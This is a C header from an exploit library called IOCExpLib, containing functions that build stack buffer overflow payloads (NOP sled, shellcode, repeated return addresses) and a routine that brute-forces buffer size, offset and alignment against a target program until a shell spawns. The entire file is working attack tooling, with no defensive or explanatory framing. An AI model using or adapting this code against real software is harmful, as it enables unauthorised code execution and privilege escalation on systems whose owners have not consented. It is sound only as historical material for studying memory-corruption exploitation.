/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_sb.h 
 *  Description: includes stack-based overflow functions
 *  Contact me - Li0n7@voila.fr
 *
 */





#ifndef __IOCEL_SB_H
#define __IOCEL_SH_H




#include "IOCExpLib.h"






#define VERBOSE
#define DEFAULT_BUFFER_SIZE             600
#define DEFAULT_ALIGN                        0
#define OFFSET_MAX                            -1000









int
IOCExpLib_sb_build(int bsize, int offset, int align, long adress, int var_env, char *shellcode)
{
      char *buff, *ptr;
      long *addr_ptr, addr;
      int i;

      if(bsize == 0)
      {
          fprintf(stderr, "[+] Buffer size must no be null\n");
          return -1;
      }

      if (!(buff = malloc(bsize))) {
          printf("[-] Can't allocate memory\n");
      exit(0);
      }

      if (!adress)
          addr = IOCExpLib_return_address(addr, offset);
      else{
          addr = adress + offset;
          fprintf(stdout, "[+] Using adress: 0x%x\n", addr);
      }

      ptr = buff;

      addr_ptr = IOCExpLib_put_raddress(addr_ptr, addr, ptr, bsize, align);

      buff = IOCExpLib_put_nop(buff, bsize/2);

      ptr = buff + ((bsize/2) - (strlen(shellcode)/2));

      ptr = IOCExpLib_put_shellcode(ptr, shellcode);

      buff[bsize - 1] = '\0';

      if (var_env == 0){
          IOCExpLib_payload = (char *)malloc(strlen(buff)+1);
          strncpy(IOCExpLib_payload, buff, strlen(buff)+1);
      } else
          IOCExpLib_set_env(buff);
      
     return 0;
}










int
IOCExpLib_sb_bruteforce(int bsize, int offset, long return_adress, char cmd[256], char *shellcode)
{
      int i, j, k, ret = 1, init_offset = offset, bsize_found = 0, offset_found = 0, align_found = 0;

      if (cmd == NULL)
      {
          fprintf(stderr, "[-] You must enter a valid prog-path to exploit\n");
          return -1;
      }

      fprintf(stdout, "[x] Starting bruteforcing offset/align/buffer size\n");

      for( i = bsize; i >= 0; i = i - 100)
      {
          for( j = offset; j >= OFFSET_MAX; j = j -100)
          {
              for( k = DEFAULT_ALIGN; k <= 3; k++)
              {
                  #ifdef VERBOSE
                      fprintf(stdout, "[+] Using buffer size = %i ; offset = %i; align = %i\n", i, j, k);
                  #endif
                  IOCExpLib_sb_build(i, j, k, return_adress, 0, shellcode);
                  IOCExpLib_split(cmd);
                  ret = IOCExpLib_tease();
                  if (ret == 0){
                      IOCExpLib_bsize = i;
                      IOCExpLib_offset = j;
                      IOCExpLib_align = k;
                      break;
                  }
              if(ret == 0) break;
              }
          if(ret == 0) break;
          }
      if(ret == 0) break;
      }

      if ( ret == 0)
          fprintf(stdout, "[+] Buffer size found: %i; offset found: %i; align found = %i, if no shell ran then try again with higher default values\n", IOCExpLib_bsize, IOCExpLib_offset, IOCExpLib_align);
      else
          fprintf(stdout, "[-] Bruteforce done, no buffer size, offset, align matching together found, try again with higer default values\n");

      return 0;
}

#endif




